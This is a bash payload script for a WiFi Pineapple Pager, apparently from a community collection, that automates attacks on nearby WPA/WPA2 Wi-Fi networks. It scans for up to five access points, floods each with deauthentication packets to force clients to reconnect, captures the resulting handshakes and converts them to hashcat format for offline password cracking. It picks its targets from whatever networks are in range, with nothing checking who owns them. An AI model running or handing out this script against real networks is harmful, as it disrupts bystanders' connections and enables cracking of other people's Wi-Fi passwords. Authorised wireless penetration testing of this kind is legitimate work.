#!/bin/bash
# Title: Handshake Collector
# Description: Automated WPA/WPA2 handshake capture for multiple access points
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Reconnaissance
# Net Mode: NAT
#
# LED State Descriptions
# Magenta Blink - Scanning for targets
# Amber Solid - Deauth attack in progress
# Green Blink - Handshake captured
# Red Blink - Error occurred

# Configuration
HANDSHAKE_DIR="/tmp/handshakes"
DEAUTH_COUNT=10
TARGET_COUNT=5  # Number of APs to target

mkdir -p "$HANDSHAKE_DIR"
LOG "Starting Handshake Collector"

# Confirm operation
resp=$(CONFIRMATION_DIALOG "Start handshake collection?")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac
case "$resp" in
    $DUCKYSCRIPT_USER_DENIED)
        exit 0
        ;;
esac

spinner_id=$(START_SPINNER "Scanning for targets...")

# Scan for nearby APs
airodump-ng wlan0mon -w /tmp/target_scan --output-format csv > /dev/null 2>&1 &
scan_pid=$!
sleep 30
kill $scan_pid 2>/dev/null

STOP_SPINNER $spinner_id

# Parse top targets by signal strength
if [ ! -f /tmp/target_scan-01.csv ]; then
    ERROR_DIALOG "No networks found"
    exit 1
fi

LOG "Parsing target list..."
targets=()
while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
    if [[ "$bssid" =~ ^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2} ]] && [[ "$privacy" =~ WPA ]]; then
        # Store as "bssid:channel:essid:power"
        targets+=("$bssid:$channel:$essid:$power")
    fi
done < <(tail -n +3 /tmp/target_scan-01.csv | grep -v "Station MAC" | head -n $TARGET_COUNT)

rm -f /tmp/target_scan-01.csv

if [ ${#targets[@]} -eq 0 ]; then
    ERROR_DIALOG "No WPA networks found"
    exit 1
fi

LOG "Found ${#targets[@]} WPA targets"
captured=0

# Attack each target
for target in "${targets[@]}"; do
    IFS=':' read -r bssid channel essid power <<< "$target"
    
    LOG "Targeting: $essid ($bssid) on channel $channel"
    ALERT "Attacking: $essid"
    
    # Start capture
    airodump-ng wlan0mon -c $channel --bssid $bssid -w "$HANDSHAKE_DIR/$bssid" > /dev/null 2>&1 &
    capture_pid=$!
    
    sleep 3
    
    # Deauth attack
    LOG "Sending deauth packets..."
    aireplay-ng -0 $DEAUTH_COUNT -a $bssid wlan0mon > /dev/null 2>&1
    
    # Wait for handshake
    sleep 10
    
    # Stop capture
    kill $capture_pid 2>/dev/null
    
    # Check for handshake
    if [ -f "$HANDSHAKE_DIR/$bssid-01.cap" ]; then
        # Verify handshake with aircrack
        if aircrack-ng "$HANDSHAKE_DIR/$bssid-01.cap" 2>&1 | grep -q "1 handshake"; then
            LOG "Handshake captured for $essid!"
            ALERT "Handshake: $essid"
            captured=$((captured + 1))
            
            # Convert to hashcat format
            hcxpcapngtool -o "$HANDSHAKE_DIR/$bssid.hc22000" "$HANDSHAKE_DIR/$bssid-01.cap" 2>/dev/null
        else
            LOG "No handshake for $essid"
            rm -f "$HANDSHAKE_DIR/$bssid-01.cap"
        fi
    fi
    
    sleep 2
done

LOG "Handshake collection complete"
LOG "Captured: $captured/${#targets[@]}"
LOG "Handshakes saved to $HANDSHAKE_DIR"

ALERT "Captured $captured handshakes"
